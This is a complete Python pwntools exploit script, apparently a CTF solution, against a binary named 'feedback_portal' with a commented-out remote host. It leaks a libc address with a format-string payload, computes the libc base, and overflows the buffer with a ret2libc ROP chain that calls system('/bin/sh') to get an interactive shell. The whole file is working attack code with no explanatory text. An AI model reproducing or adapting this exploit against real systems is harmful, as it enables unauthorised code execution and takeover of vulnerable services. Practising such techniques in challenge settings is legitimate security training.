#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./feedback_portal', checksec=False)
# Change if on server

libc = ELF('libc.so.6', checksec=False)
rop=ROP(libc)
#libc = ELF('/usr/lib/libc.so.6', checksec=False)
OFFSET_TO_RIP = 136
RET = 0x40101a
libc_call = libc.sym['__libc_start_main']
# local libc
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
# remote libc
#POP_RDI = 0x10f78b
BINSH = next(libc.search(b'/bin/sh\x00'))

p = process(elf.path)
#p = remote("offsec.m0lecon.it", 13595)

p.recvuntil(b'Please enter your name:\n')
p.sendline(b"%47$lx")
#p.sendline(b"%25$lx")

libc_start_main = p.recvline().split(b',')[1].strip()
libc_start_main = b'0x' + libc_start_main
libc_start_main = int(libc_start_main, 16)

#libc_address = libc_start_main - libc_call - 128 - 8
print(f"Libc start main dropped:{hex(libc_start_main)}")
print(f"Libc start main from symbol:{hex(libc_call)}")
print(f"BINSH:{hex(BINSH)}")
libc_address = libc_start_main - libc_call
print(f"Addr: {hex(libc_address)}")
libc.address = libc_address




print(p.recvuntil(b'Now leave your feedback:\n'))
payload = flat(
        b'A' * OFFSET_TO_RIP,
        p64(RET),
        #elf.symbols["main"],
        p64(libc_address + POP_RDI),
        p64(libc_address + BINSH),
        libc.symbols["system"]
        )
p.send(payload)
#print(p.recvline())
p.interactive()
#p = remote("offsec.m0lecon.it", 13507)
